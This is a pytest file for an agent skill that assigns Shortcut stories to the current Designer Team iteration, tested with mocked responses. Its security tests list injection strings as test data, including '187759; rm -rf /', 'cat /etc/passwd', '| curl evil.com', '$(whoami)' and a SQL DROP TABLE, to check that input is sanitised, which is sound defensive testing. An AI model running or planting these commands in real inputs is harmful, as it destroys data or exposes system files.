"""Tests for shortcut-designer-iteration skill.

Tests cover:
- Getting active Designer Team iteration
- Assigning stories to the current iteration
- Parsing various story ID formats (sc- prefix, commas, spaces)
- Error handling for invalid story IDs
"""

import pytest
from pathlib import Path

from agents.tests.lib import AgentRunner, create_mock
from agents.tests.lib.validators import (
    TemplateValidator,
    SecurityValidator,
    MarkdownValidator,
)


class TestShortcutDesignerIteration:
    """Test shortcut-designer-iteration skill behavior."""

    @pytest.mark.asyncio
    async def test_get_active_iteration(self):
        """Test getting the current active iteration without assigning stories."""
        mock_response = """Current Designer Team Iteration:
Name: [Tactics Delivery] Iteration 26.3 | Q1 R1 | Feb 2 - Feb 15 | Sprint 3
ID: 185482
Dates: Feb 2, 2026 → Feb 17, 2026
Status: started"""

        runner = AgentRunner(
            skill_name="shortcut-designer-iteration",
            mock_client=create_mock(mock_response)
        )

        result = await runner.execute("/shortcut-designer-iteration")

        assert result.success
        assert "Current Designer Team Iteration" in result.output
        assert "185482" in result.output
        assert "started" in result.output

    @pytest.mark.asyncio
    async def test_assign_single_story(self):
        """Test assigning a single story to the current iteration."""
        mock_response = """Current Iteration: Designer 26.3 - Q1 R1 (Feb 2–Feb 15) Sp 3

Assigned to iteration 185482:
✓ Story 187759

1 story assigned successfully."""

        runner = AgentRunner(
            skill_name="shortcut-designer-iteration",
            mock_client=create_mock(mock_response)
        )

        result = await runner.execute("/shortcut-designer-iteration 187759")

        assert result.success
        assert "187759" in result.output
        assert "assigned successfully" in result.output

    @pytest.mark.asyncio
    async def test_assign_multiple_stories(self):
        """Test assigning multiple stories to the current iteration."""
        mock_response = """Current Iteration: Designer 26.3 - Q1 R1 (Feb 2–Feb 15) Sp 3

Assigned to iteration 185482:
✓ Story 187759
✓ Story 187760
✓ Story 187761

All 3 stories assigned successfully."""

        runner = AgentRunner(
            skill_name="shortcut-designer-iteration",
            mock_client=create_mock(mock_response)
        )

        result = await runner.execute("/shortcut-designer-iteration 187759 187760 187761")

        assert result.success
        assert "187759" in result.output
        assert "187760" in result.output
        assert "187761" in result.output
        assert "3 stories assigned successfully" in result.output

    @pytest.mark.asyncio
    async def test_parse_sc_prefix(self):
        """Test parsing story IDs with sc- prefix."""
        mock_response = """Current Iteration: Designer 26.3 - Q1 R1 (Feb 2–Feb 15) Sp 3

Assigned to iteration 185482:
✓ Story 187759

1 story assigned successfully."""

        runner = AgentRunner(
            skill_name="shortcut-designer-iteration",
            mock_client=create_mock(mock_response)
        )

        result = await runner.execute("/shortcut-designer-iteration sc-187759")

        assert result.success
        assert "187759" in result.output


class TestShortcutDesignerIterationSecurity:
    """Security tests for shortcut-designer-iteration skill."""

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_validates_story_ids(self):
        """Verify skill validates story IDs are numeric."""
        # Story IDs should be positive integers
        valid_ids = ["187759", "sc-187759", "1", "999999"]
        invalid_ids = ["../../../etc/passwd", "'; DROP TABLE stories;--", "<script>", "../../"]

        for story_id in valid_ids:
            # Strip sc- prefix and verify it's numeric
            cleaned = story_id.replace("sc-", "")
            assert cleaned.isdigit(), f"Valid ID {story_id} should be numeric after cleaning"

        for story_id in invalid_ids:
            # These should not be valid story IDs
            cleaned = story_id.replace("sc-", "")
            assert not cleaned.isdigit(), f"Invalid ID {story_id} should not be numeric"

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_no_command_injection(self):
        """Verify skill prevents command injection in story IDs."""
        # Test that skill would extract only the numeric part
        test_cases = [
            ("187759; rm -rf /", "187759"),
            ("187759 && cat /etc/passwd", "187759"),
            ("187759 | curl evil.com", "187759"),
            ("$(whoami)", ""),  # No numeric part
            ("`whoami`", ""),   # No numeric part
        ]

        for malicious_input, expected_numeric in test_cases:
            # Extract what would be the valid numeric part
            cleaned = malicious_input.replace("sc-", "").split()[0].split(';')[0]
            if expected_numeric:
                # Should extract only the numeric ID
                assert cleaned == expected_numeric, \
                    f"Should extract {expected_numeric} from {malicious_input}, got {cleaned}"
                assert cleaned.isdigit(), f"Extracted part should be numeric: {cleaned}"
            else:
                # Should not have a valid numeric part
                assert not cleaned.isdigit(), \
                    f"Invalid input {malicious_input} should not yield numeric ID"


class TestShortcutDesignerIterationEdgeCases:
    """Edge case tests for shortcut-designer-iteration skill."""

    @pytest.mark.asyncio
    async def test_empty_input(self):
        """Test behavior with no story IDs (should just show current iteration)."""
        mock_response = """Current Designer Team Iteration:
Name: Designer 26.3 - Q1 R1 (Feb 2–Feb 15) Sp 3
ID: 185482"""

        runner = AgentRunner(
            skill_name="shortcut-designer-iteration",
            mock_client=create_mock(mock_response)
        )

        result = await runner.execute("/shortcut-designer-iteration")

        assert result.success
        assert "Current Designer Team Iteration" in result.output

    @pytest.mark.asyncio
    async def test_comma_separated_ids(self):
        """Test parsing comma-separated story IDs."""
        mock_response = """Assigned to iteration 185482:
✓ Story 187759
✓ Story 187760

2 stories assigned successfully."""

        runner = AgentRunner(
            skill_name="shortcut-designer-iteration",
            mock_client=create_mock(mock_response)
        )

        result = await runner.execute("/shortcut-designer-iteration 187759,187760")

        assert result.success
        assert "187759" in result.output
        assert "187760" in result.output

    @pytest.mark.asyncio
    async def test_mixed_valid_invalid_ids(self):
        """Test behavior when some story IDs are invalid."""
        mock_response = """Current Iteration: Designer 26.3

Results:
✓ Story 187759 - assigned
✗ Story 999999 - not found
✓ Story 187760 - assigned

2 of 3 stories assigned successfully."""

        runner = AgentRunner(
            skill_name="shortcut-designer-iteration",
            mock_client=create_mock(mock_response)
        )

        result = await runner.execute("/shortcut-designer-iteration 187759 999999 187760")

        assert result.success
        assert "187759" in result.output
        assert "999999" in result.output
        assert "187760" in result.output
        assert "2 of 3" in result.output
